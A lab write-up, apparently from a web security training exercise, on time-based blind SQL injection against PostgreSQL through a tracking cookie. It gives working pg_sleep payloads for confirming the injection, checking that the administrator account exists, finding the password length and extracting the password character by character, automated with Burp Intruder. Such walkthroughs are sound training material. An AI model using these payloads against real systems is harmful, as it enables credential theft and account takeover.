# Lab: Blind SQL injection with time delays and information retrieval

## Goal
- Extract administrator password  
- Login as administrator  

---

## Step 1: Intercept Request
- Open the lab  
- Enable Burp Proxy  
- Capture request  
- Send it to Repeater  

Observed:

TrackingId=xyz

---

## Step 2: Confirm SQL Injection (Time-Based)

Payload:

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'


- TRUE → Response delayed (~10 sec)  
- FALSE → Normal response  

Injection confirmed  

---

## Step 3: Verify Admin User

Payload:

'||(SELECT CASE WHEN username='administrator' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'


- Delay confirms administrator exists  

---

## Step 4: Extract Password Length

Payload:

'||(SELECT CASE WHEN LENGTH(password)=X THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'


- Replace `X` with values (1,2,3...)  
- When delay occurs → correct length found  

---

## Step 5: Extract Password (Character by Character)

Payload:

'||(SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'


- Change position:
  - 1 → 2 → 3 → ...  

- Try characters:
  - a–z  
  - 0–9  

- If delay occurs → correct character  

---

## Step 6: Automate Using Burp Intruder

- Send request to Intruder  
- Attack type: Sniper  
- Mark payload position:

SUBSTRING(password,1,1)='§a§'

- Payload configuration:
  - Charset: abcdefghijklmnopqrstuvwxyz0123456789  
  - Min length: 1  
  - Max length: 1  

- Start attack  

Observation:
- Response time high (~10s) → correct character  

Repeat for all positions  

---

## Step 7: Login

- Username: `administrator`  
- Password: (extracted password)  

Lab Solved  

---

## Key Payloads

Check injection:

'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'


Find length:

'||(SELECT CASE WHEN LENGTH(password)=X THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'


Extract character:

'||(SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'
